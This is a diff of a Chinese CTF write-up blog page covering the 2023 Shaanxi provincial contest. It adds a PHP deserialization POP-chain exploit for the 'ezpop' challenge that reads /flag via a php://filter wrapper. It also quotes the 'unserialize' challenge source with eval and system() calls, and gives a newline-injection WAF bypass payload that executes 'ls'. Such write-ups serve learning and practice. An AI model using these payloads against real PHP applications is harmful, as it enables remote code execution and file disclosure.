@@ -69,7 +69,7 @@
         <!--文章目录-->
         <div id="toc" class="toc-article">
     <div class="toc-title"></div>
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%92%E5%90%8D"><span class="toc-text">排名</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ezrce"><span class="toc-text">ezrce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezpop"><span class="toc-text">ezpop</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MISC"><span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%A1%E9%81%93"><span class="toc-text">管道</span></a></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%92%E5%90%8D"><span class="toc-text">排名</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ezrce"><span class="toc-text">ezrce</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezpop-%E5%A4%8D%E7%8E%B0"><span class="toc-text">ezpop(复现)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#unserialize-%E5%A4%8D%E7%8E%B0"><span class="toc-text">unserialize(复现)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E9%A2%84%E6%9C%9F"><span class="toc-text">非预期</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MISC"><span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%A1%E9%81%93"><span class="toc-text">管道</span></a></li></ol></li></ol>
 </div>
         
         <!--返回顶部-->
@@ -212,7 +212,7 @@
             
             <span class="tag">
                 
-                <a href="/blog/tags/ctf%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="color: #03a9f4">ctf线上赛</a>
+                <a href="/blog/tags/ctf%E7%BA%BF%E4%B8%8A%E8%B5%9B/" style="color: #ffa2c4">ctf线上赛</a>
             </span>
             
         </span>
@@ -280,7 +280,7 @@ cookie<span class="token punctuation">:</span> <span class="token constant">PHPS
 <p>发现flag文件</p>
 <p>用session的方式读取即可获得flag</p>
 <p><img src="/blog/2023/06/03/%E9%99%95%E8%A5%BF%E7%9C%81%E7%9C%81%E8%B5%9B2023/image-20230603152155436.png" alt="image-20230603152155436"></p>
-<h2 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h2><blockquote>
+<h2 id="ezpop-复现"><a href="#ezpop-复现" class="headerlink" title="ezpop(复现)"></a>ezpop(复现)</h2><blockquote>
 <p>反序列化</p>
 </blockquote>
 <p>打开题目，查看js文件，找到一个base64加密过的路由</p>
@@ -337,7 +337,77 @@ cookie<span class="token punctuation">:</span> <span class="token constant">PHPS
 <span class="token variable">$un</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'‮⁦快给我传参⁩⁦pop'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// </span>
 <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'seino'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>链子还没拉完，看看啥时候补上（</p>
+<p>很明显终点在<code>getFlag()</code>方法，</p>
+<p>入口是<code>__destruct</code>，对象当作字符串拼接，</p>
+<p>触发<code>__toString</code>，</p>
+<p>进入<code>go</code>方法，<code>($this-&gt;dark)();</code>对象当作函数处理</p>
+<p>触发<code>__invoke</code>，调用了不存在的方法</p>
+<p>触发<code>__call</code>，最后进入<code>getFlag()</code></p>
+<p>整个链子：（本地没打通，怪）</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">night</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$night</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">day</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$day</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">light</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$light</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">dark</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$dark</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">night</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">night</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">day</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">night</span><span class="token operator">-></span><span class="token property">day</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">dark</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">night</span><span class="token operator">-></span><span class="token property">day</span><span class="token operator">-></span><span class="token property">dark</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">light</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">night</span><span class="token operator">-></span><span class="token property">day</span><span class="token operator">-></span><span class="token property">dark</span><span class="token operator">-></span><span class="token property">light</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">day</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">night</span><span class="token operator">-></span><span class="token property">day</span><span class="token operator">-></span><span class="token property">dark</span><span class="token operator">-></span><span class="token property">light</span><span class="token operator">-></span><span class="token property">day</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">dark</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">night</span><span class="token operator">-></span><span class="token property">day</span><span class="token operator">-></span><span class="token property">dark</span><span class="token operator">-></span><span class="token property">light</span><span class="token operator">-></span><span class="token property">day</span><span class="token operator">-></span><span class="token property">dark</span><span class="token operator">=</span><span class="token string double-quoted-string">"php://filter/read=convert.base64-encode/resource=/flag"</span><span class="token punctuation">;</span>
+<span class="token variable">$b</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然后在传参的时候会发现另一个问题，这里的参数实际上存在不可见的Unicode控制字符，复制整个代码到vscode里就会发现</p>
+<p><img src="/blog/2023/06/03/%E9%99%95%E8%A5%BF%E7%9C%81%E7%9C%81%E8%B5%9B2023/image-20230603214745469.png" alt="image-20230603214745469"></p>
+<p>所以直接复制这串为参数然后传参</p>
+<p>至于底下的过滤，用伪协议就能实现绕过了</p>
+<h2 id="unserialize-复现"><a href="#unserialize-复现" class="headerlink" title="unserialize(复现)"></a>unserialize(复现)</h2><blockquote>
+<p>反射类，原生类</p>
+</blockquote>
+<p>题目源码</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">require_once</span> <span class="token string double-quoted-string">"waf.php"</span><span class="token punctuation">;</span>
+<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">getFlag</span><span class="token punctuation">&#123;</span>
+    <span class="token keyword">private</span> <span class="token variable">$password</span><span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">==</span><span class="token string double-quoted-string">"secret"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token comment">//how to change the private variables</span>
+            <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>预期解先咕咕咕了（</p>
+<h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>%0a直接非预期绕过</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">a<span class="token operator">=</span>system<span class="token operator">%</span><span class="token number">0</span>a<span class="token punctuation">(</span><span class="token string single-quoted-string">'ls'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+
+
 <hr>
 <h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h2><blockquote>
 <p>LSB隐写</p>
